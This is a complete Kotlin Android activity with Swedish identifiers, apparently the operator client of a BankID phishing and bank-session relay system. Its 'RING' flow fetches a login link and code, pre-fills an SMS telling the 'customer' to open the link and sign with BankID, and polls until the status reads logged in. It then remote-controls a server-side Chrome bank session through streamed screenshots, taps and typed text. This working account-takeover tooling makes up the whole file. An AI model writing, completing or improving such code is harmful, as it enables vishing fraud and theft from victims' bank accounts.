package com.relay

import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.drawable.BitmapDrawable
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.MotionEvent
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.HorizontalScrollView
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : Activity() {

    private lateinit var prefs: SharedPreferences
    private lateinit var statusRad: TextView
    private lateinit var bankRad: LinearLayout
    private lateinit var ringKnapp: Button
    private lateinit var kodView: TextView
    private lateinit var lankView: TextView
    private lateinit var textFalt: EditText
    private lateinit var skarm: ImageView
    private lateinit var panel: LinearLayout
    private lateinit var urlFalt: EditText
    private lateinit var debugView: TextView

    private val ui = Handler(Looper.getMainLooper())
    private val rader = ArrayDeque<String>()

    @Volatile private var bas = "http://127.0.0.1:3000"
    @Volatile private var bank = "swedbank"
    @Volatile private var kod = ""
    @Volatile private var lank = ""
    @Volatile private var stopp = false
    @Volatile private var chromeOk = false
    @Volatile private var laddar = false
    @Volatile private var rullar = false
    @Volatile private var nedY = 0f
    @Volatile private var vpW = 412
    @Volatile private var vpH = 900

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        prefs = getSharedPreferences("relay", MODE_PRIVATE)
        bas = prefs.getString("bas", "http://127.0.0.1:3000") ?: "http://127.0.0.1:3000"
        bank = prefs.getString("bank", "swedbank") ?: "swedbank"
        bygg()
        trad { laddaBanker() }
        startaSkarm()
        startaHalsa()
    }

    private fun bygg() {
        val rot = LinearLayout(this)
        rot.orientation = LinearLayout.VERTICAL
        rot.setBackgroundColor(Color.parseColor("#0f1419"))

        statusRad = TextView(this)
        statusRad.setTextColor(Color.WHITE)
        statusRad.textSize = 13f
        statusRad.setPadding(dp(10), dp(9), dp(10), dp(9))
        statusRad.setBackgroundColor(Color.parseColor("#7f1d1d"))
        statusRad.text = "startar..."
        rot.addView(statusRad, LinearLayout.LayoutParams(-1, -2))

        val hs = HorizontalScrollView(this)
        hs.isHorizontalScrollBarEnabled = false
        bankRad = LinearLayout(this)
        bankRad.orientation = LinearLayout.HORIZONTAL
        hs.addView(bankRad)
        rot.addView(hs, LinearLayout.LayoutParams(-1, -2))

        ringKnapp = Button(this)
        ringKnapp.text = "RING"
        ringKnapp.textSize = 20f
        ringKnapp.setBackgroundColor(Color.parseColor("#16a34a"))
        ringKnapp.setTextColor(Color.WHITE)
        rot.addView(ringKnapp, LinearLayout.LayoutParams(-1, dp(58))
            .also { it.setMargins(dp(8), dp(4), dp(8), dp(4)) })

        val rad = LinearLayout(this)
        rad.orientation = LinearLayout.HORIZONTAL
        kodView = TextView(this)
        kodView.setTextColor(Color.parseColor("#fde047"))
        kodView.textSize = 23f
        kodView.setPadding(dp(10), 0, dp(8), 0)
        rad.addView(kodView, LinearLayout.LayoutParams(0, -2, 1f))
        val smsKnapp = Button(this)
        smsKnapp.text = "SMS"
        smsKnapp.textSize = 13f
        smsKnapp.setBackgroundColor(Color.parseColor("#2563eb"))
        smsKnapp.setTextColor(Color.WHITE)
        smsKnapp.setOnClickListener { smsa() }
        rad.addView(smsKnapp, LinearLayout.LayoutParams(-2, -2))
        rot.addView(rad, LinearLayout.LayoutParams(-1, -2))

        lankView = TextView(this)
        lankView.setTextColor(Color.parseColor("#9ae6b4"))
        lankView.textSize = 11f
        lankView.setTextIsSelectable(true)
        lankView.setPadding(dp(10), 0, dp(10), 0)
        lankView.setOnClickListener { kopiera(lank) }
        rot.addView(lankView, LinearLayout.LayoutParams(-1, -2))

        val textRad = LinearLayout(this)
        textRad.orientation = LinearLayout.HORIZONTAL
        textFalt = EditText(this)
        textFalt.hint = "skriv / selektor"
        textFalt.setTextColor(Color.WHITE)
        textFalt.setHintTextColor(Color.parseColor("#6b7280"))
        textFalt.textSize = 12f
        textFalt.setSingleLine(true)
        textRad.addView(textFalt, LinearLayout.LayoutParams(0, -2, 2f))
        for ((txt, a) in listOf("TXT" to "txt", "ENT" to "enter", "TAB" to "tab",
                                "BSK" to "back", "SEL" to "sel")) {
            val b = Button(this)
            b.text = txt
            b.textSize = 10f
            b.setBackgroundColor(Color.parseColor("#334155"))
            b.setTextColor(Color.WHITE)
            b.setOnClickListener { tryck(a) }
            textRad.addView(b, LinearLayout.LayoutParams(0, -2, 1f))
        }
        rot.addView(textRad, LinearLayout.LayoutParams(-1, -2))

        panel = LinearLayout(this)
        panel.orientation = LinearLayout.VERTICAL
        panel.visibility = View.GONE
        urlFalt = EditText(this)
        urlFalt.setText(bas)
        urlFalt.setTextColor(Color.WHITE)
        urlFalt.textSize = 11f
        urlFalt.setSingleLine(true)
        panel.addView(urlFalt, LinearLayout.LayoutParams(-1, -2))
        debugView = TextView(this)
        debugView.setTextColor(Color.parseColor("#ecc94b"))
        debugView.textSize = 9f
        panel.addView(debugView, LinearLayout.LayoutParams(-1, -2))
        rot.addView(panel, LinearLayout.LayoutParams(-1, -2))

        skarm = ImageView(this)
        skarm.scaleType = ImageView.ScaleType.FIT_XY
        skarm.setBackgroundColor(Color.BLACK)
        skarm.isClickable = true
        rot.addView(skarm, LinearLayout.LayoutParams(-1, 0, 1f))

        setContentView(rot)

        statusRad.setOnLongClickListener {
            panel.visibility = if (panel.visibility == View.GONE) View.VISIBLE else View.GONE
            true
        }
        urlFalt.setOnEditorActionListener { _, _, _ ->
            bas = urlFalt.text.toString().trim().trimEnd('/')
            prefs.edit().putString("bas", bas).apply()
            trad { laddaBanker() }
            trad { skickaViewport() }
            true
        }

        ringKnapp.setOnClickListener { ring() }

        skarm.addOnLayoutChangeListener { _, _, _, _, _, _, _, _, _ ->
            val w = skarm.width; val h = skarm.height
            if (w > 60 && h > 60) {
                vpW = (w / resources.displayMetrics.density).toInt()
                vpH = (h / resources.displayMetrics.density).toInt()
                trad { skickaViewport() }
            }
        }

        skarm.setOnTouchListener { _, e ->
            when (e.actionMasked) {
                MotionEvent.ACTION_DOWN -> { nedY = e.y; rullar = true; true }
                MotionEvent.ACTION_UP -> {
                    val dy = e.y - nedY
                    if (Math.abs(dy) > 30f) {
                        val d = (-dy * vpH / skarm.height).toInt()
                        trad { post("/api/rulla", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
                            ",\"y\":" + py(e.y) + ",\"dy\":" + d + "}") }
                    } else {
                        trad { post("/api/peka", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
                            ",\"y\":" + py(e.y) + "}") }
                    }
                    rullar = false
                    true
                }
                else -> false
            }
        }
    }

    private fun tryck(a: String) {
        val t = textFalt.text.toString()
        when (a) {
            "sel" -> if (t.isNotEmpty()) trad { post("/api/klick", JSONObject().put("bank", bank).put("sel", t).toString()) }
            "txt" -> if (t.isNotEmpty()) {
                trad { post("/api/text", JSONObject().put("bank", bank).put("t", t).toString()) }
                textFalt.setText("")
            }
            else -> trad { post("/api/tangent", JSONObject().put("bank", bank).put("k", a).toString()) }
        }
    }

    private fun ring() {
        kod = ""; lank = ""
        ui.post { kodView.text = ""; lankView.text = ""; ringKnapp.isEnabled = false; ringKnapp.text = "STARTAR..." }
        trad {
            try {
                val j = JSONObject(post("/api/kor", JSONObject().put("bank", bank).toString()))
                if (j.optBoolean("ok")) {
                    kod = j.optString("code")
                    lank = j.optString("lank")
                    ui.post {
                        kodView.text = "KOD " + kod
                        lankView.text = lank
                        ringKnapp.isEnabled = true
                        ringKnapp.text = "RING IGEN"
                        status("Vantar pa att kunden oppnar lanken", "#b45309")
                        kopiera(lank)
                    }
                    folj()
                } else {
                    ui.post {
                        ringKnapp.isEnabled = true; ringKnapp.text = "RING"
                        status("KOR-FEL: " + j.optString("fel"), "#7f1d1d")
                    }
                }
            } catch (e: Throwable) {
                ui.post {
                    ringKnapp.isEnabled = true; ringKnapp.text = "RING"
                    status("KOR-FEL - servern svarar inte", "#7f1d1d")
                }
                logga("KOR " + e.toString().take(80))
            }
        }
    }

    private fun folj() {
        val k = kod
        while (!stopp && kod == k && k.isNotEmpty()) {
            try {
                val j = JSONObject(get("/api/state?code=" + k))
                if (j.optBoolean("inloggad")) { ui.post { status("INLOGGAD", "#15803d") }; return }
                if (j.optBoolean("signed")) ui.post { status("Kunden signerar - vantar pa inloggning", "#b45309") }
                if (j.optBoolean("token") && !j.optBoolean("signed")) ui.post { status("Kunden har lanken - vantar pa signering", "#b45309") }
            } catch (e: Throwable) { }
            try { Thread.sleep(2000) } catch (e: Throwable) { }
        }
    }

    private fun smsa() {
        if (lank.isEmpty()) return
        val txt = "Hej! Oppna lanken och signera med BankID: " + lank
        try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("sms:?body=" + Uri.encode(txt)))) }
        catch (e: Throwable) { logga("sms-fel " + e.toString().take(60)) }
    }

    private fun kopiera(t: String) {
        if (t.isEmpty()) return
        (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
            .setPrimaryClip(ClipData.newPlainText("lank", t))
        ui.post { status("Lank kopierad - skicka till kunden", "#b45309") }
    }

    private fun status(t: String, farg: String) {
        statusRad.text = t
        statusRad.setBackgroundColor(Color.parseColor(farg))
    }

    private fun laddaBanker() {
        try {
            val arr = JSONObject(get("/api/banker")).optJSONArray("banker") ?: return
            val lista = ArrayList<Triple<String, String, String>>()
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                lista.add(Triple(o.optString("nyckel"), o.optString("namn"), o.optString("start")))
            }
            ui.post {
                bankRad.removeAllViews()
                for ((k, n, _) in lista) {
                    val b = Button(this)
                    b.text = n
                    b.textSize = 12f
                    b.setBackgroundColor(if (k == bank) Color.parseColor("#2563eb") else Color.parseColor("#334155"))
                    b.setTextColor(Color.WHITE)
                    b.setOnClickListener {
                        bank = k
                        prefs.edit().putString("bank", k).apply()
                        status("bank: " + n, "#15803d")
                        laddaBanker()
                    }
                    bankRad.addView(b, LinearLayout.LayoutParams(-2, -2)
                        .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
                }
            }
        } catch (e: Throwable) { logga("banker " + e.toString().take(70)) }
    }

    private fun startaSkarm() {
        Thread {
            while (!stopp) {
                if (chromeOk && !laddar) {
                    laddar = true
                    try {
                        val j = JSONObject(get("/api/skarm?bank=" + bank + "&t=" + System.currentTimeMillis()))
                        if (j.optBoolean("ok")) {
                            val b = Base64.decode(j.optString("bild"), Base64.DEFAULT)
                            val bm = BitmapFactory.decodeByteArray(b, 0, b.size)
                            ui.post {
                                if (bm != null) {
                                    val g = skarm.drawable
                                    skarm.setImageBitmap(bm)
                                    (g as? BitmapDrawable)?.bitmap?.recycle()
                                }
                            }
                        }
                    } catch (e: Throwable) { }
                    laddar = false
                }
                try { Thread.sleep(if (rullar) 320L else 1000L) } catch (e: Throwable) { }
            }
        }.start()
    }

    private fun startaHalsa() {
        Thread {
            while (!stopp) {
                var ok = false
                try {
                    val j = JSONObject(get("/api/halsa"))
                    ok = j.optBoolean("ok")
                    chromeOk = j.optBoolean("chrome")
                } catch (e: Throwable) { ok = false; chromeOk = false }
                ui.post {
                    if (!ok) status("SERVER NERE - kor server/relay.sh", "#7f1d1d")
                    else if (!chromeOk) status("WEBLASARE NERE - kor server/relay.sh", "#7f1d1d")
                    else if (kod.isEmpty()) status("REDO", "#15803d")
                }
                try { Thread.sleep(3000) } catch (e: Throwable) { }
            }
        }.start()
    }

    private fun px(x: Float) = (x / skarm.width * vpW).toInt()
    private fun py(y: Float) = (y / skarm.height * vpH).toInt()

    private fun skickaViewport() {
        try { post("/api/viewport", "{\"w\":" + vpW + ",\"h\":" + vpH + "}") } catch (e: Throwable) { }
    }

    private fun post(vag: String, kropp: String): String {
        val c = URL(bas + vag).openConnection() as HttpURLConnection
        c.requestMethod = "POST"
        c.connectTimeout = 8000
        c.readTimeout = 25000
        c.doOutput = true
        c.setRequestProperty("Content-Type", "application/json")
        c.outputStream.use { it.write(kropp.toByteArray()) }
        val sc = c.responseCode
        return (if (sc in 200..299) c.inputStream else c.errorStream)
            ?.bufferedReader()?.use { it.readText() } ?: ""
    }

    private fun get(vag: String): String {
        val c = URL(bas + vag).openConnection() as HttpURLConnection
        c.connectTimeout = 8000
        c.readTimeout = 25000
        val sc = c.responseCode
        return (if (sc in 200..299) c.inputStream else c.errorStream)
            ?.bufferedReader()?.use { it.readText() } ?: ""
    }

    private fun trad(b: () -> Unit) {
        Thread { try { b() } catch (e: Throwable) { logga("FEL " + e.toString().take(70)) } }.start()
    }

    private fun logga(s: String) {
        ui.post {
            rader.addLast(s.replace("\n", " ").take(160))
            while (rader.size > 5) rader.removeFirst()
            debugView.text = rader.joinToString("\n")
        }
    }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    override fun onDestroy() { stopp = true; super.onDestroy() }
}
